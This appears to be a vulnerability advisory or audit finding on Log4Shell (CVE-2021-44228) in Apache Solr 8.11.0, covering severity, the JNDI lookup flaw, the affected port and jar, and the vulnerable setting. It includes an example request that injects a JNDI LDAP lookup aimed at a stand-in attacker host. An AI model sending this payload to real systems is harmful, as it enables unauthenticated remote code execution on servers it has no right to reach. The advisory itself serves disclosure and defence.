# Apache Solr 8.11.0 — Log4Shell (CVE-2021-44228)

## Severity
**Critical** (CVSS 10.0)

## CVE / CWE
- CVE-2021-44228 (Log4Shell)
- CWE-917: Improper Neutralization of Special Elements used in an Expression Language

## Description
Apache Solr 8.11.0 bundles `log4j-core-2.14.1.jar`. Log4j 2.0-beta9 through
2.14.1 evaluates JNDI lookup expressions (`${jndi:ldap://...}`) embedded in
logged strings. Any user-controlled input that reaches a logger — Solr query
parameters, HTTP headers, User-Agent — can trigger a lookup against an
attacker-controlled LDAP or RMI server, which returns a serialized Java class
that Log4j loads and executes. This gives unauthenticated remote code
execution as the Solr process user.

Solr's admin handler logs query parameters at INFO level, so a request such
as:

```
GET /solr/admin/cores?action=${jndi:ldap://attacker.example/a}
```

is sufficient to trigger the lookup.

## Affected Service
- **Service:** Apache Solr 8.11.0
- **Port:** 8983/TCP
- **Vulnerable artifact:** `/opt/solr/server/lib/ext/log4j-core-2.14.1.jar`

## Vulnerable Configuration
- `log4j-core` version 2.14.1
- `-Dlog4j2.formatMsgNoLookups=false` (JNDI substitution enabled)
